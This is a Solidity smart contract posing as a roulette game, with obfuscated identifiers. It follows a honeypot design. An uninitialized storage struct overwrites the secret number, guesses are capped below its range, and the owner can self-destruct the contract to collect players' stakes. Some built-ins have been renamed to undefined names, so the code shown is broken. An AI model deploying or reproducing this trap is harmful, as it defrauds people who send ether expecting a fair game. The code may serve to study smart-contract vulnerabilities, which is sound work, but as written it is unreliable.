pragma solidity ^0.4.19;


contract CryptoRoulette {

    uint256 private _0x7eaccf;
    uint256 public _0xf3693b;
    uint256 public _0x05bf16 = 0.1 ether;
    address public _0x1a5dfe;

    struct Game {
        address _0xc403d2;
        uint256 number;
    }
    Game[] public _0x42f75c;

    function CryptoRoulette() public {
        _0x1a5dfe = msg.sender;
        _0x5cc8f7();
    }

    function _0x5cc8f7() internal {

        _0x7eaccf = uint8(_0xbc6e55(_0xebb6d9, block.blockhash(block.number-1))) % 20 + 1;
    }

    function _0x4946ba(uint256 number) payable public {
        require(msg.value >= _0x05bf16 && number <= 10);
        Game _0xd6b895;
        _0xd6b895._0xc403d2 = msg.sender;
        _0xd6b895.number = number;
        _0x42f75c.push(_0xd6b895);

        if (number == _0x7eaccf) {

            msg.sender.transfer(this.balance);
        }

        _0x5cc8f7();
        _0xf3693b = _0xebb6d9;
    }

    function _0xbd928b() public {
        if (msg.sender == _0x1a5dfe && _0xebb6d9 > _0xf3693b + 1 days) {
            suicide(msg.sender);
        }
    }

    function() public payable { }
}